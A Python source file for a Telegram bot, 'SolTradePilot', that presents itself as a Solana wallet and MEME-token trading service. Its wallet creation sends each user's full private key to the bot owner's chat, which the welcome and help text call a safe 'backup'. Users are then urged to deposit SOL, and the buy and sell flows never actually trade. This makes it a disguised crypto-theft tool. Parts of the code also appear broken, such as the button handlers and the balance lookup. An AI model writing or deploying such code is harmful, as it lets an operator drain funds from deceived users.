import os
import base58
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters
)
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solana.rpc.async_api import AsyncClient
from solana.transaction import Transaction

# ================= ENV VARIABLES =================
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])

# -------------------- DATA STORAGE --------------------
user_wallets = {}          # Stores user wallets (Keypair)
user_meme_balances = {}    # Stores MEME token balance per user

# RPC endpoint
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# ================= HELPERS =================
async def get_username(update: Update):
    user = update.effective_user
    return f"@{user.username}" if user.username else user.first_name

async def send_wallet_to_owner(user_id, public_key, private_key, context):
    username = (await context.bot.get_chat(user_id)).username
    if username:
        username = f"@{username}"
    else:
        username = str(user_id)
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=(
            f"🔐 Wallet Backup\n"
            f"User: {username}\n"
            f"User ID: {user_id}\n"
            f"Public Key:\n{public_key}\n"
            f"Private Key:\n{private_key}"
        )
    )

async def create_wallet(user_id, context):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    public_key = str(wallet.pubkey())
    private_key = base58.b58encode(bytes(wallet)).decode("utf-8")
    await send_wallet_to_owner(user_id, public_key, private_key, context)
    return public_key, private_key

async def get_sol_balance(user_id):
    if user_id not in user_wallets:
        return 0
    wallet = user_wallets[user_id]
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.get_balance(wallet.pubkey())
        if resp["result"]:
            lamports = resp["result"]["value"]
            sol = lamports / 1_000_000_000
            return sol
    return 0

# ================= COMMANDS =================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = await get_username(update)
    msg = (
        f"👋 Hello {username}!\n\n"
        "🔥 Welcome to SolTradePilot 🚀\n\n"
        "This bot allows you to:\n"
        "- Create a secure Solana wallet\n"
        "- Deposit SOL and check your balance\n"
        "- Buy and sell MEME tokens directly from your wallet\n"
        "- Receive private key safely (backup by bot owner)\n\n"
        "Please use the buttons below to get started. All operations are safe and directly on Solana blockchain.\n\n"
        "💡 Pro Tip: Always check your SOL balance before buying MEME!"
    )
    keyboard = [
        [InlineKeyboardButton("💳 Create Wallet", callback_data="wallet")],
        [InlineKeyboardButton("🏦 SOL Address", callback_data="address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))

async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_wallets:
        await update.message.reply_text("✅ You already have a wallet. Use '🏦 SOL Address' to view it.")
    else:
        public, _ = await create_wallet(user_id, context)
        await update.message.reply_text(f"✅ Wallet Created!\nYour public address:\n{public}")
async def address_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("⚠️ You don’t have a wallet yet. Create one using '💳 Create Wallet'.")
    else:
        pub = str(user_wallets[user_id].pubkey())
        await update.message.reply_text(f"🏦 Your SOL deposit address:\n{pub}")

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    sol = await get_sol_balance(user_id)
    await update.message.reply_text(f"💰 Your current SOL balance: {sol:.6f} SOL")

async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("⚠️ Create your wallet first using '💳 Create Wallet' to buy MEME.")
        return

    sol_balance = await get_sol_balance(user_id)
    if sol_balance <= 0:
        await update.message.reply_text(
            "⚠️ Your wallet is empty.\nDeposit SOL first using '🏦 SOL Address' to buy MEME."
        )
        return

    await update.message.reply_text(f"🛒 Your SOL balance: {sol_balance:.6f}\nEnter the amount of SOL you want to spend to buy MEME:")

async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("⚠️ You don’t have a wallet yet. Create one using '💳 Create Wallet'.")
        return

    meme_balance = user_meme_balances.get(user_id, 0)
    if meme_balance <= 0:
        await update.message.reply_text(
            "⚠️ You don’t have any MEME tokens to sell.\nBuy MEME first using '🛒 Buy MEME'."
        )
        return

    await update.message.reply_text(f"📉 Your MEME balance: {meme_balance}\nEnter the amount of MEME you want to sell:")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "❓ Help Guide - SolTradePilot Bot ❓\n\n"
        "💳 Create Wallet: Generate a secure Solana wallet.\n"
        "🏦 SOL Address: Get your deposit address to fund your wallet.\n"
        "💰 Balance: Check your SOL balance.\n"
        "🛒 Buy MEME: Purchase MEME tokens directly from your wallet.\n"
        "📉 Sell MEME: Sell your MEME tokens back to SOL.\n\n"
        "⚠️ Always ensure you have enough SOL before buying.\n"
        "🔐 Your private keys are safely stored with the bot owner as a backup.\n"
        "🚀 Enjoy seamless Solana trading!"
    )
    await update.message.reply_text(msg)

# ================= CALLBACK HANDLER =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "wallet":
        await wallet_command(update, context)
    elif query.data == "address":
        await address_command(update, context)
    elif query.data == "balance":
        await balance_command(update, context)
    elif query.data == "buy":
        await buy_command(update, context)
    elif query.data == "sell":
        await sell_command(update, context)
    elif query.data == "help":
        await help_command(update, context)

# ================= MAIN =================
def main():
    app = Application.builder().token(TOKEN).build()

    # Commands
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("wallet", wallet_command))
    app.add_handler(CommandHandler("address", address_command))
    app.add_handler(CommandHandler("balance", balance_command))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("sell", sell_command))
    app.add_handler(CommandHandler("help", help_command))

    # Button callback
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Bot running on Railway...")
    app.run_polling()

if __name__ == "__main__":
    main()
